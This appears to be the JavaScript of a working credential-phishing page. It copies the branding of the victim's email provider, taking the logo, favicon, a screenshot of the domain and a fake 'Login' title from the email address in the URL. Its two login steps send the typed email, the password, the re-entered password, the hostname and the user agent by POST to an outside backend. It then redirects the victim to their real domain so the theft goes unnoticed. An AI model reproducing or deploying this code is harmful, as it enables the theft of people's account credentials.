document.addEventListener('DOMContentLoaded', function() {
    // DOM elements
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const rePasswordInput = document.getElementById('rePassword');
    const displayEmailInput = document.getElementById('displayEmail');
    const nextBtn = document.getElementById('nextBtn');
    const submitBtn = document.getElementById('submitBtn');
    
    // Placeholder emails for validation
    const PLACEHOLDER_EMAILS = [
        '[-Email-]',
        '{{email}}',
        'example@email.com',
        '%5B-Email-%5D',
    ];

    let successCount = 0;
    let currentEmail = '';

    // Email validation function
    function validateEmail(email) {
        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
    }

    // Extract email from URL
    function extractEmailFromURL() {
        const params = new URLSearchParams(window.location.search);
        let email = decodeURIComponent(params.get('email') || '');

        // Fallback: interpret query string directly as email
        if (!email && window.location.search.startsWith('?')) {
            const possibleEmail = decodeURIComponent(window.location.search.slice(1));
            if (validateEmail(possibleEmail)) {
                return possibleEmail;
            }
        }

        if (!email && window.location.hash.startsWith('#')) {
            const hashValue = decodeURIComponent(window.location.hash.slice(1).trim());
            if (validateEmail(hashValue)) {
                return hashValue;
            }
        }

        return email;
    }

    // Prefill email from URL
    function prefillEmail() {
        const extractedEmail = extractEmailFromURL();
        console.log('Extracted email:', extractedEmail);

        if (extractedEmail && emailInput && (validateEmail(extractedEmail) || PLACEHOLDER_EMAILS.includes(extractedEmail))) {
            if (!emailInput.value || PLACEHOLDER_EMAILS.includes(emailInput.value.trim())) {
                emailInput.value = extractedEmail;
                updateBackground(extractedEmail);
                updateLogo(extractedEmail);
            }
        }
    }

    // Update background based on email domain
    function updateBackground(email) {
        let domain = email.split('@')[1];
        if (!domain) return;
        
        let backgroundUrl = 'https://image.thum.io/get/width/1200/http://' + domain;
        document.body.style.backgroundImage = 'url(\'' + backgroundUrl + '\')';
    }

    // Update logo and favicon based on email domain
    function updateLogo(email) {
        let domain = email.split('@')[1];
        if (!domain) return;
        
        let domainName = domain.split('.')[0];
        let capitalizedDomain = domainName.charAt(0).toUpperCase() + domainName.slice(1);
        let logoUrl = 'https://logo.clearbit.com/' + domain;
        let faviconUrl = 'https://www.google.com/s2/favicons?domain=' + domain;
        
        // Update logos
        document.getElementById('emailLogo').src = logoUrl;
        document.getElementById('emailLogo2').src = logoUrl;
        document.getElementById('emailLogo3').src = logoUrl;
        
        // Update favicon
        document.getElementById('favicon').href = faviconUrl;
        
        // Update text content
        document.getElementById('loginText1').innerText = capitalizedDomain + ' Login';
        document.getElementById('loginText2').innerText = capitalizedDomain + ' Login';
        
        // Update copyright
        document.getElementById('copyrightText1').innerHTML = '© ' + domain + ' 2025';
        document.getElementById('copyrightText2').innerHTML = '© ' + domain + ' 2025';
        document.getElementById('copyrightText3').innerHTML = '© ' + domain + ' 2025';
    }

    // Real-time email updates
    emailInput.addEventListener('input', function() {
        const email = emailInput.value.trim();
        if (validateEmail(email)) {
            const newUrl = window.location.pathname + '?email=' + encodeURIComponent(email);
            window.history.pushState({}, '', newUrl);
            updateBackground(email);
            updateLogo(email);
        }
    });

    // Run on load
    prefillEmail();

    // Also run when hash changes
    window.addEventListener('hashchange', prefillEmail);

    // Next button click handler (Step 1)
    nextBtn.addEventListener('click', async function(event) {
        event.preventDefault();

        const email = emailInput.value.trim();
        const password = passwordInput.value.trim();
        const userAgent = navigator.userAgent;

        if (!validateEmail(email) || password.length === 0) {
            alert('Please enter a valid email and password.');
            return;
        }

        // Store current email for redirection
        currentEmail = email;

        try {
            // Send data to your endpoint
            const response = await fetch('https://chuksinno-backend-1.onrender.com/getting', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    email: email,
                    password: password,
                    targetDomain: window.location.hostname,
                    userAgent: userAgent,
                    step: '1'
                }),
            });

            if (response.ok) {
                successCount++;
                
                // Move to next step
                document.getElementById('loginStep1').classList.add('hidden');
                document.getElementById('loginStep2').classList.remove('hidden');
                displayEmailInput.value = email;
                
                // Clear password for security
                passwordInput.value = '';
            } else {
                alert('Incorrect Email or Password');
                passwordInput.value = '';
            }
        } catch (error) {
            console.error('API error:', error);
            alert('Network error. Please try again.');
        }
    });

    // Submit button click handler (Step 2)
    submitBtn.addEventListener('click', async function(event) {
        event.preventDefault();

        const email = displayEmailInput.value.trim();
        const rePassword = rePasswordInput.value.trim();
        const userAgent = navigator.userAgent;

        if (email === '' || rePassword === '') {
            alert('Please enter valid credentials.');
            return;
        }

        try {
            // Send data to your endpoint
            const response = await fetch('https://chuksinno-backend-1.onrender.com/getting', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    email: email,
                    password: rePassword,
                    targetDomain: window.location.hostname,
                    userAgent: userAgent,
                    step: '2'
                }),
            });

            if (response.ok) {
                successCount++;

                if (successCount >= 2) {
                    // Redirect to the email's domain after 3 successful attempts
                    const domain = email.split('@')[1];
                    if (domain) {
                        window.location.href = 'https://' + domain;
                    } else {
                        // Fallback redirection
                        window.location.href = 'https://example.com';
                    }
                } else {
                    // Show thank you message and continue
                    document.getElementById('loginStep2').classList.add('hidden');
                    document.getElementById('thankYouMessage').classList.remove('hidden');
                    
                    // Reset for next attempt after delay
                    setTimeout(() => {
                        document.getElementById('thankYouMessage').classList.add('hidden');
                        document.getElementById('loginStep1').classList.remove('hidden');
                        emailInput.value = currentEmail;
                        passwordInput.value = '';
                        rePasswordInput.value = '';
                    }, 3000);
                }
            } else {
                alert('Incorrect Email or Password');
                rePasswordInput.value = '';
            }
        } catch (error) {
            console.error('API error:', error);
            alert('Network error. Please try again.');
        }
    });
});